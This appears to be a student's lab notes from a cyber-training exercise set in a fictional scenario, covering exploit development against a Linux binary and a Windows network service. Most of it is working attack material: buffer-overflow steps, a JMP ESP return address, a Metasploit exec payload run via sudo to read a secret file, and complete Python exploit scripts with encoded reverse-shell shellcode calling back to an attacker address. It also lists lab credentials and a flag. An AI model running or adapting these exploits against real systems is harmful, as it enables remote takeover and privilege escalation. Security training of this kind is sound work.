Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

Python
OllyDBG or an equivelent graphical program
http://www.ollydbg.de/
GNU Debugger's(GDB) Python Exploit Development Assistance Module
https://github.com/longld/peda
MetaSploit
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245
Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

### Linux 
Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.
Enter the contents of /.secret/.verysecret.pdb as the flag

- buffer 75 char; EIP = 76 bit
- buff = 'a' * 76
- EIP = vvv
- find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
  - 0xf7df1b51  
  - 0xf7f6674b  
  - 0xf7f72753  
  - 0xf7f72c6b  
    - eip = '\x51\x1b\xdf\xf7'
- NOP = '\x90' * 10
- msf 
  - use payload/linux/x86/exec
  - set CMD cat /.secret/.verysecret
  - generate -b "\x00, \x0d, \x0a, \x20" -f python

- sudo /.hidden/inventory.exe <<< $(python mal.py)

### Windows
Executable Package: SecureServerind.exe & essfunc.dll
Task: Perform a remote buffer overflow on the vulnerable Windows executable from your Linux_analyst box. Gain a shell using exploit code Method: Utilize RE toolset and python to launch and develop exploit.
Launch your remote exploit at the Donovian Windows target on 192.168.150.245 to gain initial access. Your flag is within the public documents.

- tunnel to webserver
- search /var/www/ folder for longTermStorage folder
- pull secureserverind.exe and essfunc.dll and send to winops box
  - proxychains wget -r http://127.0.0.1/longTermStorage/
- send buffer overflow initial tests to win ops box
```
#! /usr/bin/python

import socket

buff = 'HELP'

winbox = '10.50.26.184'

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) # create the socket
s.connect((winbox, 9999)) # connect to target
print s.recv(1024) # print response

s.send(buff) # send the stage
# s.send(buff + EIP + NOP + buf) # send the stage
print s.recv(1024) # print second response
s.close() # close socket
```
- send crash tests
```
#! /usr/bin/python

import socket

buff = 'TRUN /.:/'
buff += <str>

winbox = '10.50.26.184'

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) # create the socket
s.connect((winbox, 9999)) # connect to target
print s.recv(1024) # print response

s.send(buff) # send the stage
# s.send(buff + EIP + NOP + buf) # send the stage
print s.recv(1024) # print second response
s.close() # close socket
```
- find EIP offset and search str for where that occurs
- find JMP ESP from EIP offset in ID
  - `!mona jmp -r ESP -m "essfunc.dll"`
  - Windows > Log data > Results
- Update python script
- get msfconsole payload
- set up nc -lvnp <port> listener
- send python script
```
#! /usr/bin/python

import socket

# buff = 'HELP'
buff = 'TRUN /.:/' # command to send
buff += 'A' * 2003


EIP = '\xa0\x12\x50\x62'
# 625012AD
# 625012BA

NOP =  '\x90' * 20

# windows/shell_reverse_tcp - 351 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.50.28.168, LPORT=4444, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, 
# AutoVerifySession=true
buf =  b""
buf += b"\xbd\x78\x18\xa1\xa3\xdd\xc0\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc\x03\x12"
buf += b"\x16\x43\x56\x1e\xce\x01\x99\xde\x0f\x66\x13\x3b"
buf += b"\x3e\xa6\x47\x48\x11\x16\x03\x1c\x9e\xdd\x41\xb4"
buf += b"\x15\x93\x4d\xbb\x9e\x1e\xa8\xf2\x1f\x32\x88\x95"
buf += b"\xa3\x49\xdd\x75\x9d\x81\x10\x74\xda\xfc\xd9\x24"
buf += b"\xb3\x8b\x4c\xd8\xb0\xc6\x4c\x53\x8a\xc7\xd4\x80"
buf += b"\x5b\xe9\xf5\x17\xd7\xb0\xd5\x96\x34\xc9\x5f\x80"
buf += b"\x59\xf4\x16\x3b\xa9\x82\xa8\xed\xe3\x6b\x06\xd0"
buf += b"\xcb\x99\x56\x15\xeb\x41\x2d\x6f\x0f\xff\x36\xb4"
buf += b"\x6d\xdb\xb3\x2e\xd5\xa8\x64\x8a\xe7\x7d\xf2\x59"
buf += b"\xeb\xca\x70\x05\xe8\xcd\x55\x3e\x14\x45\x58\x90"
buf += b"\x9c\x1d\x7f\x34\xc4\xc6\x1e\x6d\xa0\xa9\x1f\x6d"
buf += b"\x0b\x15\xba\xe6\xa6\x42\xb7\xa5\xae\xa7\xfa\x55"
buf += b"\x2f\xa0\x8d\x26\x1d\x6f\x26\xa0\x2d\xf8\xe0\x37"
buf += b"\x51\xd3\x55\xa7\xac\xdc\xa5\xee\x6a\x88\xf5\x98"
buf += b"\x5b\xb1\x9d\x58\x63\x64\x31\x08\xcb\xd7\xf2\xf8"
buf += b"\xab\x87\x9a\x12\x24\xf7\xbb\x1d\xee\x90\x56\xe4"
buf += b"\x79\x95\x94\xfa\xd1\xc1\xda\x02\x33\x4e\x52\xe4"
buf += b"\x59\x7e\x32\xbf\xf5\xe7\x1f\x4b\x67\xe7\xb5\x36"
buf += b"\xa7\x63\x3a\xc7\x66\x84\x37\xdb\x1f\x64\x02\x81"
buf += b"\xb6\x7b\xb8\xad\x55\xe9\x27\x2d\x13\x12\xf0\x7a"
buf += b"\x74\xe4\x09\xee\x68\x5f\xa0\x0c\x71\x39\x8b\x94"
buf += b"\xae\xfa\x12\x15\x22\x46\x31\x05\xfa\x47\x7d\x71"
buf += b"\x52\x1e\x2b\x2f\x14\xc8\x9d\x99\xce\xa7\x77\x4d"
buf += b"\x96\x8b\x47\x0b\x97\xc1\x31\xf3\x26\xbc\x07\x0c"
buf += b"\x86\x28\x80\x75\xfa\xc8\x6f\xac\xbe\xf9\x25\xec"
buf += b"\x97\x91\xe3\x65\xaa\xff\x13\x50\xe9\xf9\x97\x50"
buf += b"\x92\xfd\x88\x11\x97\xba\x0e\xca\xe5\xd3\xfa\xec"
buf += b"\x5a\xd3\x2e"

winbox = '192.168.150.245'

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) # create $
s.connect((winbox, 9999)) # connect to target
print s.recv(1024) # print response

#s.send(buff) # send the stage
s.send(buff + EIP + NOP + buf) # send the stage

print s.recv(1024) # print second response
s.close() # close socket
```
- Once on box, in CMD shell
  - dir
  - type
  - cd

